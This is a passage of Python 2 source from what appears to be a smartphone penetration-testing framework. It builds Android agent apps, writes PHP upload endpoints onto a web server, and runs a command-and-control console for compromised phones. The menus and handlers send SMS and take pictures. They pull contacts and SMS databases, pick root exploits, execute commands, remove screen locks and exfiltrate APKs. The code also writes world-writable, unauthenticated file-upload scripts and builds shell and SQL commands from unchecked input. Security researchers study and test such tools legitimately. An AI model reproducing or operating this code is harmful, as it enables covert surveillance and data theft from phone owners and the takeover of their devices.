            db = DB(config=config)
            db.query("INSERT INTO "+table+" (id,ip,exploit,vuln,agent) VALUES (DEFAULT,%s,%s,%s,%s)", (ipaddress,alpine,vulnerable,agent))
            break

def get_modem():
    while True:
        db = DB(config=config)
        db.query("SELECT COUNT(*) from modems")
        row = db.fetchone()[0]
        if row == 0:
            return 0

        if row == 1:
            return 1

        print "\n\nAvailable Modems:\n\n"

        for i in range(1, row+1):
            db.query("SELECT number from modems where id=%s", (i,))
            r = db.fetchone()[0]
            print "\t" + str(i) + ".) " + r + "\n"

        print "\nSelect a modem to interact with"        
        chosenmodem = raw_input('spf> ').strip()
        if int(chosenmodem) <= row:
            return chosenmodem

def add_modem():
    sqlserver = config.get("MYSQLSERVER")
    ipaddress = config.get("IPADDRESS")
    while True:
        print "\n\nChoose a type of modem to attach to:"
        print "\t1.) Search for attached modem"
        print "\t2.) Attach to a smartphone based app"
        print "\t3.) Generate smartphone based app"
        print "\t4.) Copy App to Webserver"
        print "\t5.) Install App via ADB"
        choice6  = int(raw_input('spf> ').strip())
        if choice6 == 1:
	    if os.path.exists("/dev/ttyUSB2"):
                print "USB Modem Found"
                usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                usb.write("ATZ\r\n")
                time.sleep(1)
                line = usb.read(255)
                print line
                usb.close()
                path = "/zoom"
                number = "/dev/ttyUSB1"
	        key = "NULL"
                modemtype = "usb"
                make_files2(path)
                database_add2(number,path,key,modemtype)
                break

            elif os.path.exists("/dev/ttyUSB1"):
                print "USB Modem Found"
                usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                usb.write("ATZ\r\n")
                time.sleep(1)
                line = usb.read(255)
                print line
                usb.close()
                path = "/huawei"
                number = "/dev/ttyUSB1"
                key = "NULL"
                modemtype = "usb"
                make_files2(path)
                database_add2(number,path,key,modemtype)
                break
            else:
                print "No USB Modem Found"
                break

        if choice6 == 2:
            app_connect()
            break

        if choice6 == 3:
            app_make()
            break
        
        if choice6 == 4:        
            copyapp()
            break
        
        if choice6 == 5:        
            appadb()
            break
        
        if choice6 == 0:
            break

def copyapp():
    webpath = config.get("WEBSERVER")
    while True:
        print "Which App?"
        print "\t1.)Framework Android App with NFC"
        print "\t2.)Framework Android App without NFC"
        which = int(raw_input('spf> ').strip())
        if which == 1:
            path = raw_input('Hosting Path: ').strip()
            filename = raw_input('Filename: ').strip()
            fullpath = webpath + path
            command1 = "mkdir " + fullpath
            os.system(command1)
            location = config.get("ANDROIDAPPNFCAPP")
            command = "cp " + location + " " + webpath + path + filename
            os.system(command)
            break

        if which == 2:
            path = raw_input('Hosting Path: ').strip()
            filename = raw_input('Filename: ').strip()
            fullpath = webpath + path
            command1 = "mkdir " + fullpath
            os.system(command1)
            location = config.get("ANDROIDAPPAPP")
            command = "cp " + location + " " + webpath + path + filename
            os.system(command)
            break

def appadb():
    androidsdk = config.get("ANDROIDSDK")
    adbstring = androidsdk + "/platform-tools/adb"
    while True:
        command = adbstring + " devices"
        os.system(command)
        device = raw_input('Choose a device to install on: ').strip()

        print "Which App?\n"
        print "\t1.)Framework Android App with NFC\n"
        print "\t2.)Framework Android App without NFC\n"
        which = int(raw_input('spf> ').strip())
        
        if which == 1:        
            location = config.get("ANDROIDAPPNFCAPP")
            command = adbstring + " -s " + device + " install " + location
            os.system(command)
            break
        
        if which == 2:
            location = config.get("ANDROIDAPPAPP")
            command = adbstring + " -s " + device + " install " + location
            os.system(command)
            break
def app_make():
    print "\n\nChoose a type of control app to generate:"
    print "\t1.) Android App (Android 1.6)"
    print "\t2.) Android App with NFC (Android 4.0 and NFC enabled device)"

    choice5 = raw_input('spf> ').strip()

    if choice5 == '1':
        makeandroid()
        return
    
    if choice5 == '2':
        makeandroid2()
        return
    
    if choice5 == '0':
        return

    return

def makeandroid():
    sourcelocation = config.get("ANDROIDAPP")
    androidsdk = config.get("ANDROIDSDK")
    androidapplocation = config.get("ANDROIDAPPAPP")
    fullpath1 = sourcelocation + "/res/values/strings.xml"
    controlphone  = raw_input('Phone number of agent: ').strip()
    controlkey = raw_input('Control key for the agent: ').strip()
    controlpath = raw_input('Webserver control path for agent: ').strip()
    correct  = raw_input("\n\nControl Number:" +  controlphone +  "\nControl Key:" + controlkey + "\nControlPath:" + controlpath + "\nIs this correct?(y/n)").strip().lower()

    if correct == "y":
        command = "sed -i \'s/<string-array name=\"keyarray\"\>\<item\>.*/<string-array name=\"keyarray\"\>\<item\>" + controlkey + "\<\\/item\><\\/string-array> /' " + fullpath1
        os.system(command)
        command = "sed -i \'s/<string-array name=\"agentarray\"><item>.*/<string-array name=\"agentarray\"><item>" + controlphone + "<\\/item><\\/string-array> /' " + fullpath1
        os.system(command)
        command = "sed -i \'s/<string-array name=\"patharray\"><item>.*/<string-array name=\"patharray\"><item>\\" + controlpath + "<\\/item><\\/string-array> /' " + fullpath1
        os.system(command)
        command = androidsdk + "/tools/android update project --path " + sourcelocation + " --target \"Google Inc.:Google APIs:4\""
        os.system(command)
        command = androidsdk + "/tools/android update project --path " + sourcelocation
        os.system(command)
        command = "ant -f " + sourcelocation +  "/build.xml clean debug"
        os.system(command)
        command = "cp " + sourcelocation + "/bin/" + "FrameworkAndroidAppActivity-debug-unaligned.apk " + androidapplocation
        os.system(command)

def makeandroid2():
    sourcelocation = config.get("ANDROIDAPPNFC")
    androidsdk = config.get("ANDROIDSDK")
    androidappnfclocation = config.get("ANDROIDAPPNFCAPP")
    fullpath1 = sourcelocation + "/res/values/strings.xml"
    controlphone  = raw_input('Phone number of agent: ').strip()
    controlkey = raw_input('Control key for the agent: ').strip()
    controlpath = raw_input('Webserver control path for agent: ').strip()
    correct  = raw_input("\n\nControl Number:" +  controlphone +  "\nControl Key:" + controlkey + "\nControlPath:" + controlpath + "\nIs this correct?(y/n): ").strip().lower()

    if correct == "y":
        command = "sed -i \'s/\<string-array name=\"keyarray\"\>\<item\>.*/\<string-array name=\"keyarray\"\>\<item\>" + controlkey + "\<\\/item\><\\/string-array> /' " + fullpath1
        os.system(command)
        command = "sed -i \'s/<string-array name=\"agentarray\"><item>.*/<string-array name=\"agentarray\"><item>" + controlphone + "<\\/item><\\/string-array> /' " + fullpath1
        os.system(command)
        command = "sed -i \'s/<string-array name=\"patharray\"><item>.*/<string-array name=\"patharray\"><item>\\" + controlpath + "<\\/item><\\/string-array> /' " + fullpath1
        os.system(command)
        command = androidsdk + "/tools/android update project --path " + sourcelocation + " --target \"Google Inc.:Google APIs:14"
        os.system(command)
        command = androidsdk + "/tools/android update project --path "  + sourcelocation
        os.system(command)
        command = "ant -f " + sourcelocation +  "/build.xml clean debug"
        os.system(command)
        command = "cp " + sourcelocation + "/bin/" + "FrameworkAndroidAppActivity-debug-unaligned.apk " + androidappnfclocation
        os.system(command)

def app_connect():
    while True:
        print "\nConnect to a smartphone management app. You will need to supply the phone number,the control key, and the URL path\n"
        number = raw_input('Phone Number: ').strip()
        key = raw_input('Control Key: ').strip()
        path = raw_input('App URL Path: ').strip()

        correct = raw_input("\n\nPhone Number: " + number + "\nControl Key: " + key + "\nURL Path: " + path  + "\nIs this correct?(y/N): ").strip().lower()
        if correct == "y":
            make_files2(path)
            handshake(path,key)
            modemtype = "app"
            database_add2(number,path,key,modemtype)
            startcommand = "python poller.py " + path + " " + key + " > log"
            pid = os.fork()

            if pid == 0:
                os.system(startcommand)
            break

def handshake(path, key):
    webserver = config.get("WEBSERVER")
    fullpath = webserver + path + "/connect"
    while True:
        f = open(fullpath, 'r+')
        line = f.readline()
        correctstring = key + " CONNECT"
        if line == correctstring:
            command = "\n" + key + " CONNECTED"
            f.write(command)
            f.close()
            print "CONNECTED!\n"
            break
        else:
            f.close()
            time.sleep(1)

def database_add2(number, path, key, _type):
    table = "modems"

    db = DB(config=config)

    db.query("INSERT INTO "+table+" (id,number,path,controlkey,type) VALUES (DEFAULT, %s, %s, %s, %s)", (number,path,key, _type))

def make_files2(path):
    webserver = config.get("WEBSERVER")
    fullpath = webserver + path
    command1 = "mkdir " + fullpath
    os.system(command1)
    command11 = "chmod 777 " + fullpath
    os.system(command11) 
    connectfile = fullpath + "/connect"
    command2 = "touch " + connectfile
    os.system(command2)
    command3 = "chmod 777 " + connectfile
    os.system(command3)
    picturefile = fullpath + "/picture.jpg"
    command4 = "touch " + picturefile
    os.system(command4)
    command5 = "chmod 777 " + picturefile
    os.system(command5)
    textfile = fullpath + "/text.txt"
    command6 = "touch " + textfile
    os.system(command6)
    command7 = "chmod 777 " + textfile
    os.system(command7)
    textfile2 = fullpath + "/text2.txt"
    command77 = "touch " + textfile2
    os.system(command77)
    command7777 = "chmod 777 " + textfile2
    os.system(command7777)
    pictureupload = fullpath + "/pictureupload.php"
    command8 = "touch " + pictureupload
    os.system(command8)
    command9 = "chmod 777 " + pictureupload
    os.system(command9)
    pictureuploadtext = "<?php\n$base=$_REQUEST['picture'];\necho $base;\n$binary=base64_decode($base);\nheader('Content-Type: bitmap; charset=utf-8');\n$file = fopen('picture.jpg', 'wb');\nfwrite($file, $binary);\nfclose($file);\n?>";
    PICFILE = open(pictureupload, 'w')
    PICFILE.write(pictureuploadtext)
    PICFILE.close()
    textupload = fullpath + "/textuploader.php"
    command10 = "touch " + textupload
    os.system(command10)
    command11 = "chmod 777 " + textupload
    os.system(command11)
    textuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('text.txt', 'ab');\nfwrite($file, $base);\n?>";
    TEXTFILE = open(textupload, 'w')
    TEXTFILE.write(textuploadtext)
    TEXTFILE.close()
    text2upload = fullpath + "/text2uploader.php"
    command100 = "touch " + text2upload
    os.system(command100)
    command110 = "chmod 777 " + text2upload
    os.system(command110)    
    text2uploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('text2.txt', 'wb');\nfwrite($file, $base);\n?>";
    TEXT2FILE = open(text2upload, 'w')
    TEXT2FILE.write(text2uploadtext)
    TEXT2FILE.close()
    connectupload = fullpath + "/connectuploader.php"
    command12 = "touch " + connectupload
    os.system(command12)
    command13 = "chmod 777 " + connectupload
    os.system(command13)    
    connectuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('connect','wb');\nfwrite($file, $base);\n?>";
    CONNECTFILE = open(connectupload, "w")
    CONNECTFILE.write(connectuploadtext)
    CONNECTFILE.close()
    getfuncfile = fullpath + "/getfunc"
    command6 = "touch " + getfuncfile
    os.system(command6)
    command7 = "chmod 777 " + getfuncfile
    os.system(command7)
    putfuncfile = fullpath + "/putfunc"
    command6 = "touch " + putfuncfile
    os.system(command6)
    command7 = "chmod 777 " + putfuncfile
    os.system(command7)
    getfuncupload = fullpath + "/getfuncuploader.php"
    command10 = "touch " + getfuncupload
    os.system(command10)
    command11 = "chmod 777 " + getfuncupload
    os.system(command11)
    getfuncuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('getfunc', 'wb');\nfwrite($file, $base);\n?>";
    GETFUNCUPLOADFILE = open(getfuncupload, 'w')
    GETFUNCUPLOADFILE.write(getfuncuploadtext)
    GETFUNCUPLOADFILE.close()
    putfuncupload = fullpath + "/putfuncuploader.php"
    command10 = "touch " + putfuncupload
    os.system(command10)
    command11 = "chmod 777 " + putfuncupload
    os.system(command11)
    putfuncuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('putfunc', 'wb');\nfwrite($file, $base);\n?>";
    PUTFUNCUPLOADFILE = open(putfuncupload, 'w')
    PUTFUNCUPLOADFILE.write(putfuncuploadtext)
    PUTFUNCUPLOADFILE.close()
    appupload = fullpath + "/apkupload.php"
    command12 = "touch " + appupload
    os.system(command12)
    command13 = "chmod 777 " + appupload
    os.system(command13)
    appuploadtext = "<?php\n$file_path = basename( $_FILES['uploadedfile']['name']);\n$f = fopen('text.txt', 'wb');\n$data = $file_path;\nfwrite($f, $data);\nfclose($f);\nif(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $file_path)) {\necho 'success';\n} else{\necho 'fail';\n}\n?>"
    APPUPFILE = open(appupload, 'w')
    APPUPFILE.write(appuploadtext)
    APPUPFILE.close()

def view_data():
    webserver = config.get("WEBSERVER")
    print "View Data Gathered from a Deployed Agent:"
    print
    age = raw_input("Agents or Attacks?").strip()
    if age.lower() == "agents": 
     while True:
        print
        print
        print "Available Agents:"
        print
        print

        db = DB(config=config)
        db.query("SELECT COUNT(*) from agents")
        count = db.fetchone()[0]

        for i in range(1, count+1):
            db.query("SELECT number from agents where id=%s", (i,))
            r = db.fetchone()[0]
            print "\t" + str(i) + ".) " + r

        print
        print "Select an agent to interact with or 0 to return to the previous menu."
        choice = raw_input('spf> ').strip().lower()

        if choice == "exit" or choice == '0':
            return

        for j in range(1, count+1):
            if choice == str(j):
                get_data(j)
                break
    elif age.lower() == "attacks" : 
	db = DB(config=config)
	db.query("SELECT * from client")
	print "Client Side Attacks:\n"
	print "Id   Number           Exploit     Vulnerable"
	rows = db.fetchall()
	for row in rows :
		print row[0], "  |  ", row[1], "  |  ", row[2], "  |  ", row[3]	 
       
	raw_input("Press <Enter> to continue")

def get_data(id):
    db = DB(config=config)

    db.query("SELECT sms from data where id=%s", (id,))
    smsrow = db.fetchone()[0]

    db.query("SELECT contacts from data where id=%s", (id,))
    contactsrow = db.fetchone()[0]

    db.query("SELECT picture from data where id=%s", (id,))
    picturerow = db.fetchone()[0]

    db.query("SELECT root from data where id=%s", (id,))
    rootrow = db.fetchone()[0]

    db.query("SELECT ping from data where id=%s", (id,))
    pingrow = db.fetchone()[0]

    db.query("SELECT file from data where id=%s", (id,))
    filerow = db.fetchone()[0]

    db.query("SELECT packages from data where id=%s", (id,))
    packagerow = db.fetchone()[0]

    db.query("SELECT apk from data where id=%s", (id,))
    apkrow = db.fetchone()[0]

    db.query("SELECT ipaddress from data where id=%s", (id,))
    ipaddressrow = db.fetchone()[0]

    print
    print
    print "Data:"
    print "SMS Database: " + (smsrow if smsrow else '')
    print "Contacts: " + (contactsrow if contactsrow else '')
    print "Picture Location: " + (picturerow if picturerow else '')
    print "Rooted: " + (rootrow if rootrow else '')
    print "Ping Sweep: " + (pingrow if pingrow else '')
    print "File: " + (filerow if filerow else '')
    print "Packages: " + (packagerow if packagerow else '')
    print "App: " + (apkrow if apkrow else '')
    print "Wifi IP Address: " + (ipaddressrow if ipaddressrow else ' ')	
    raw_input("Press <Enter> to continue")

def agent_attach():

    webserver = config.get("WEBSERVER")
    sqlserver = config.get("MYSQLSERVER")
    ipaddress = config.get("IPADDRESS")

    print "Attach to a Deployed Agent:"
    print
    while True:
        print "This will set up handlers to control an agent that has already been deployed."
        print
        path = raw_input('Agent URL Path: ').strip()
        key = raw_input('Agent Control Key: ').strip()
	method = raw_input('Communication Method(SMS/HTTP): ').strip()
        correct = raw_input("\n\nURL Path: " + path + "\nControl Key: " + key + "\nCommunication Method: " + method  + "\nIs this correct?(y/N): ").strip()
        if correct.lower() == "y":
            if path != "":
                make_files(path)
            if method.lower() == "http" :
            	command = key + " ATTA WEB"
            	control = webserver + path + "/control"

            	f = open(control, 'w')
            	f.write(command)
            	f.close()
            	time.sleep(60)

            	text = webserver + path + "/text.txt"
            	f = open(text, 'r+')
            	line = f.readline()
            	lines = line.split(',')
            	try:
                	phonenumber = lines[1]
            	except IndexError:
                	phonenumber = ''

            	try:
                	platform = lines[2]
            	except IndexError:
                	platform = ''

            	try:
                	phonenumber2 = lines[3]
            	except IndexError:
                	phonenumber2 = ''
	    	try:
			osversion = lines[4]
	    	except IndexError:
			osversion = ''
            	f.close()
            	f = open(text, 'w')
            	f.write("")
            	f.close()

            	database_add(phonenumber,path,key,phonenumber2,platform,osversion)
            	_type = config.get("DATABASETYPE")
            	db = DB(config=config)
            	if _type == "postgres":
                	query2 = "SELECT id from agents where number=" + "\'" + phonenumber + "\'"
            	elif _type == "mysql":
                	phonenumberr = "\"" + phonenumber + "\""
                	query2 = "SELECT id from agents where number=" + phonenumberr

            	db.query(query2)	
            	id = db.fetchone()[0]
            	startcommand = "python agentpoll.py " + path + " " + key + " " + str(id) + " > log2";

            	pid = os.fork()

            	if pid == 0:
                	os.system(startcommand)

            	break
            elif method.lower() == "sms" :
	        db = DB(config=config)

		modem = get_modem()
            	if int(modem) == 0:
                 print "\nNo modems found. Attach a modem to use this functionality"
                else:
                 command = key + " ATTA SMS"
		 db.query("SELECT path from modems where id=" + str(modem))
                 path2     = db.fetchone()[0]
                 db.query("SELECT controlkey from modems where id=" + str(modem))
                 key2        = db.fetchone()[0]
                 number2 = raw_input('Agent Phone Number: ').strip()
                 db.query("SELECT type from modems where id=" + str(modem))
                 modemtype2 = db.fetchone()[0]
		 if  modemtype2 == "usb" :
                        usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                        usb.write("ATZ\r\n")
                        time.sleep(1)
                        line = usb.read(255)
                        print line
                        time.sleep(1)
                        usb.write("AT+CMGF=1\r\n")
                        line = usb.read(255)
                        print line
                        time.sleep(1)
                        numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                        usb.write(numberline)
                        line = usb.read(255)
                        print line
                        time.sleep(1)
                        usb.write( command + struct.pack('b', 26) )
                        time.sleep(2)
                        line = usb.read(255)
                        print line
                        time.sleep(60)
                        line = usb.read(255)
                        print line
                        values1 = line
			total = ""
			while True:
				new = values1.find('\n', 2)
				print new
				if new ==  -1 :
                                        break
 
                        	subber = substr( values1, 2, 6 )
                        	print subber
                        	get = "+CMTI:"
                        	if  subber == get :

                            		values2 = split( ',', values1 )
                            		offset = values2[1]
					print offset
                            		usb.write("AT+CPMS=\"SM\"\r\n")
                            		time.sleep(1)
                            		line = usb.read(255)
                            		msg  = "AT+CMGR=" + offset + "\r\n"
                            		usb.write(msg)
                            		time.sleep(2)
                            		line = usb.read(255)
                            		print line
                            		values3 = split( '"', line )
                            		_len = len(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		firstring = ' '.join(values3)
                            		firstring = firstring.strip()
                            		_len = len(firstring)
                            		print _len
                            		print firstring
                            		amount = _len - (8 + 6)
                            		stringtwo = substr( firstring, 8, amount )
                            		print stringtwo
  					total += stringtwo
					send = "AT+CMGD=" + offset + "\r\n"
					usb.write(send)
					line = usb.read(255)
					print line
				values1 = values1[(new + 1):]
				print values1
                        usb.close() 
			lines = total.split(',')
            		try:
                		phonenumber = lines[1]
            		except IndexError:
                		phonenumber = ''

            		try:
                		platform = lines[2]
            		except IndexError:
                		platform = ''

            		try:
                		phonenumber2 = lines[3]
            		except IndexError:
                		phonenumber2 = ''
	    		try:
				osversion = lines[4]
	    		except IndexError:
				osversion = ''
                        database_add(phonenumber,path,key,phonenumber2,platform,osversion)
            		_type = config.get("DATABASETYPE")
            		db = DB(config=config)
            		if _type == "postgres":
                		query2 = "SELECT id from agents where number=" + "\'" + phonenumber + "\'"
            		elif _type == "mysql":
                		phonenumberr = "\"" + phonenumber + "\""
                		query2 = "SELECT id from agents where number=" + phonenumberr

            		db.query(query2)
            		id = db.fetchone()[0]
            		startcommand = "python agentpoll.py " + path + " " + key + " " + str(id) + " > log2";

            		pid = os.fork()

            		if pid == 0:
                		os.system(startcommand)

            		break

                 elif  modemtype2 == "app" :
			command2 = key2 + " " + "SEND" + " " + number2 + " " + command
                        control = webserver + path2 + "/getfunc"
                        CONTROLFILE = open(control, 'w')
                        CONTROLFILE.write(command2)
                        CONTROLFILE.close()
                        time.sleep(60)
                        text = webserver + path2 + "/text.txt"
            		f = open(text, 'r+')
            		line = f.readline()
            		lines = line.split(',')
            		try:
                		phonenumber = lines[1]
            		except IndexError:
                		phonenumber = ''

            		try:
                		platform = lines[2]
            		except IndexError:
                		platform = ''
            		try:
                		phonenumber2 = lines[3]
            		except IndexError:
                		phonenumber2 = ''
	    		try:
				osversion = lines[4]
	    		except IndexError:
				osversion = ''
            		f.close()
            		f = open(text, 'w')
            		f.write("")
            		f.close()
            		database_add(phonenumber,path,key,phonenumber2,platform,osversion)
            		_type = config.get("DATABASETYPE")
            		db = DB(config=config)
            		if _type == "postgres":
                		query2 = "SELECT id from agents where number=" + "\'" + phonenumber + "\'"
            		elif _type == "mysql":
                		phonenumberr = "\"" + phonenumber + "\""
                		query2 = "SELECT id from agents where number=" + phonenumberr

            		db.query(query2)
            		id = db.fetchone()[0]
            		startcommand = "python agentpoll.py " + path + " " + key + " " + str(id) + " > log2";

            		pid = os.fork()

            		if pid == 0:
                		os.system(startcommand)

            		break

def make_files(path):
    webserver = config.get("WEBSERVER")
    fullpath = webserver + path
    command1 = "mkdir " + fullpath
    os.system(command1)
    command11 = "chmod 777 " + fullpath
    os.system(command11)
    controlfile = fullpath + "/control"
    command2 = "touch " + controlfile
    os.system(command2)
    command3 = "chmod 777 " + controlfile
    os.system(command3)
    picturefile = fullpath + "/picture.jpg"
    command4 = "touch " + picturefile
    os.system(command4)
    command5 = "chmod 777 " + picturefile
    os.system(command5)
    textfile = fullpath + "/text.txt"
    command6 = "touch " + textfile
    os.system(command6)
    command7 = "chmod 777 " + textfile
    os.system(command7)
    pictureupload = fullpath + "/pictureupload.php"
    command8 = "touch " + pictureupload
    os.system(command8)
    command9 = "chmod 777 " + pictureupload
    os.system(command9)
    pictureuploadtext = "<?php\n$base=$_REQUEST['picture'];\necho $base;\n$binary=base64_decode($base);\nheader('Content-Type: bitmap; charset=utf-8');\n$file = fopen('picture.jpg', 'wb');\nfwrite($file, $binary);\nfclose($file);\n?>";
    f = open(pictureupload, 'w')
    f.write(pictureuploadtext)
    f.close()
    textupload = fullpath + "/textuploader.php"
    command10 = "touch " + textupload
    os.system(command10)
    command11 = "chmod 777 " + textupload
    os.system(command11)    
    textuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('text.txt', 'wb');\nfwrite($file, $base);\n?>";
    f = open(textupload, 'w')
    f.write(textuploadtext)
    f.close()
    controlupload = fullpath + "/controluploader.php"
    command12 = "touch " + controlupload
    os.system(command12)
    command13 = "chmod 777 " + controlupload
    os.system(command13)    
    controluploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('control','wb');\nfwrite($file, $base);\n?>";
    f = open(controlupload, 'w')
    f.write(controluploadtext)
    f.close()
    putfile = fullpath + "/putfunc"
    command14 = "touch " + putfile
    os.system(command14)
    command15 = "chmod 777 " + putfile
    os.system(command15)    
    appupload = fullpath + "/apkupload.php"
    command12 = "touch " + appupload
    os.system(command12)
    command13 = "chmod 777 " + appupload
    os.system(command13)
    appuploadtext = "<?php\n$file_path = basename( $_FILES['uploadedfile']['name']);\n$f = fopen('text.txt', 'wb');\n$data = $file_path;\nfwrite($f, $data);\nfclose($f);\nif(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $file_path)) {\necho 'success';\n} else{\necho 'fail';\n}\n?>"
    APPUPFILE = open(appupload, 'w')
    APPUPFILE.write(appuploadtext)
    APPUPFILE.close()

def database_add(number, path, key, number2, platform, osversion):
    table = "agents"
    table2 = "data"
    _type = config.get("DATABASETYPE")

    db = DB(config=config)

    db.query("INSERT INTO "+table+" (id,number,path,controlkey,controlnumber,platform,osversion) VALUES (DEFAULT,%s,%s,%s,%s,%s,%s)", (number,path,key,number2,platform,osversion))
    db.query("INSERT INTO "+table2+" (id,sms,contacts,picture,root,packages,apk) VALUES (DEFAULT, NULL, NULL, NULL, NULL, NULL,NULL)")

def agent_control():
    webserver = config.get("WEBSERVER")
    ipaddress = config.get("IPADDRESS")
    while True:
        print "\n\nAvailable Agents:"
        print
        db = DB(config=config)
        db.query("SELECT COUNT(*) from agents")
        row = db.fetchone()[0]
        for i in range(1, row+1):
            db.query("SELECT number from agents where id=%s", (i, ))
            r = db.fetchone()[0]
            print "\t" + str(i) + ".) " + r + "\n"

        print "\nSelect an agent to interact with or 0 to return to the previous menu"
        chosenagent = raw_input('spf> ').strip()
        if chosenagent == "exit" or chosenagent == '0':
            break

        for j in range(1,row+1):
            if int(chosenagent) == j:
                db.query("SELECT number from agents where id=%s", (j,))
                number = db.fetchone()[0]
                db.query("SELECT controlkey from agents where id=%s", (j,))
                key = db.fetchone()[0]
                db.query("SELECT path from agents where id=%s", (j,))
                path = db.fetchone()[0].replace('"', '')
                control_agent(number,path,key,j)   

def control_agent(number, path, key, id):

    while True:
        webserver = config.get("WEBSERVER")
        # 
        ipaddress = config.get("IPADDRESS")

        print "\n\nCommands:\n"
        print "\t1.) Send SMS"
        print "\t2.) Take Picture"
        print "\t3.) Get Contacts"
        print "\t4.) Get SMS Database"
        print "\t5.) Privilege Escalation"
        print "\t6.) Download File"
        print "\t7.) Execute Command"
        print "\t8.) Upload File"
        print "\t9.) Ping Sweep"
        print "\t10.) TCP Listener"
        print "\t11.) Connect to Listener"
	print "\t12.) Run Nmap"
	print "\t13.) Execute Command and Upload Results"
	print "\t14.) Get Installed Apps List"
	print "\t15.) Remove Locks (Android < 4.4)"
	print "\t16.) Upload APK"
        print "\t17.) Get Wifi IP Address"
        print "\t\nSelect a command to perform or 0 to return to the previous menu"

        choice1 = raw_input('spf> ').strip()

        if choice1 == "exit" or choice1 == '0':
            break
        if choice1 == '17':
            getip(number,path,key,id)
	if choice1 == '16':
	    uploadapk(number,path,key,id)
        if choice1 == '15':
            removelocks(number,path,key,id)
	if choice1 == '14':
	    pmlist(number,path,key,id)
	if choice1 == '13':
	    execup(number,path,key,id)
	if choice1 == '12':
	    runnmap(number,path,key,id)
        if choice1 == '1':
            spam(number,path,key,id)
        if choice1 == '3':
            getcontacts(number,path,key,id)
        if choice1 == '2':
            picture(number, path, key,id)
        if choice1 == '4':
            getsms(number, path, key,id)
        if choice1 == '5':
            root1(number, path, key,id)
        if choice1 == '6':
            down(number,path,key,id)
        if choice1 == '7':
            run(number,path,key,id)
        if choice1 == '8':
            upload(number,path,key,id)
        if choice1 == '9':
            ping(number,path,key,id)
        if choice1 == '10':
            listener(number,path,key,id)
        if choice1 == '11':
            connectlisten(number,path,key,id)
def getip(number,path,key,id):
    webserver = config.get("WEBSERVER")
    ipaddress = config.get("IPADDRESS")
    while True:
        print "Get's the IP address on the local Wifi network"
        deliverymethod = raw_input('Delivery Method(SMS or HTTP) ').strip().lower()
        returnmethod = raw_input('Return Method(SMS or HTTP) ').strip().lower()
        if returnmethod == "sms":
            modem = get_modem()
            if int(modem) == 0:
                print "\nNo modems found. Attach a modem to use this functionality"
            else:
                command = key + " " + "GTIP" + " " + deliverymethod + " " + returnmethod + " " +  str(modem) + "\n"; 
                if deliverymethod == "http":
                    control = webserver + path + "/putfunc"
                    f = open(control, 'w')
                    f.write(command)
                    f.close()
                    break


                if deliverymethod == "sms":
                    control = webserver + path + "/putfunc"
                    f = open(control, 'w')
                    f.write(command)
                    f.close()
                    break

        if returnmethod == "http":
            if deliverymethod == "http":
                command = key + " GTIP " + deliverymethod + " " + returnmethod + "\n"
                control = webserver + path + "/putfunc"
                f = open(control, 'w')
                f.write(command)
                f.close()
                break

            if deliverymethod == "sms":
                modem = get_modem()
                if int(modem) == 0:
                        print "\nNo modems found. Attach a modem to use this functionality"
                else:
                    command = key + " GTIP " + deliverymethod + " " + returnmethod + " " + str(modem) + "\n"
                    control = webserver + path + "/putfunc"
                    f = open(control, 'w')
                    f.write(command)
                    f.close()
                    break




def uploadapk(number,path,key,id):
    webserver = config.get("WEBSERVER")
    ipaddress = config.get("IPADDRESS")

    while True: 
	print "Uploads an APK file from the device for analysis"
	db = DB(config=config)
	db.query("SELECT packages from data where id=%s", (id,))
        packagerow = db.fetchone()[0]
    	print "Packages: " + (packagerow if packagerow else "Package list not found. Run 14.) Get Installed Apps List to populate")
	print "Which package do you want to upload?"
	choice1 = raw_input('spf> ').strip()
        if choice1 == "exit" or choice1 == '0':
            break
	else :
	    apk = choice1
	    delivery = raw_input('Delivery Method (SMS or HTTP): ').strip().lower()
            command = key + " UAPK " + delivery + " "  + apk + "\n"
            if delivery == "http":
             command = key + " UAPK " + "none "  + delivery + " "  + apk + "\n"
             control = webserver + path + "/putfunc"
             f = open(control, 'w')
             f.write(command)
             f.close()
             break
            if delivery == "sms":
             modem = get_modem()
             if int(modem) == 0:
                print "\nNo modems found. Attach a modem to use this functionality"
             else:
		command = key + " UAPK " + str(modem) + " " + delivery + " "  + apk + "\n"
                control = webserver + path + "/putfunc"
                f = open(control, 'w')
                f.write(command)
                f.close()
                break

def root1(number,path,key,id):
    while True:
 	print "\t1.) Choose a Root Exploit"
        print "\t2.) Let SPF AutoSelect"
        print "\t\nSelect an option or 0 to return to the previous menu"
        choice1 = raw_input('spf> ').strip()
        if choice1 == "exit" or choice1 == '0':
            break
        if choice1 == '1':
	    rootchoice(number,path,key,id)
	    break
	if choice1 == '2':
	    choose = "choose"
	    root(number,path,key,id,choose)
	    break
def rootchoice(number,path,key,id):
    db = DB(config=config)
    db.query("SELECT platform from agents where id=%s", (id,))
    plat = db.fetchone()[0]
    sploitdir = config.get("EXPLOITSLOC")
    if plat == "Android":
	     while True:
		    tempdir = sploitdir + "/Android/binaries/"
		    print "Choose an Android Root Exploit"
        	    files = os.listdir(tempdir)
                    i=0
                    choices = []
                    for f in files:
                	i+=1
                	choices.append(f)
                	print "\t" + str(i) + ".) " + f
 
        	    choice = raw_input('spf> ').strip()
                    pick = int(choice)-1
        	    if choice == '0':
            		break
        	    elif pick < len(choices):
            		choose = choices[pick]
			root(number,path,key,id,choose)
			break
def removelocks(number,path,key,id):
    webserver = config.get("WEBSERVER")
    ipaddress = config.get("IPADDRESS")
    while True:
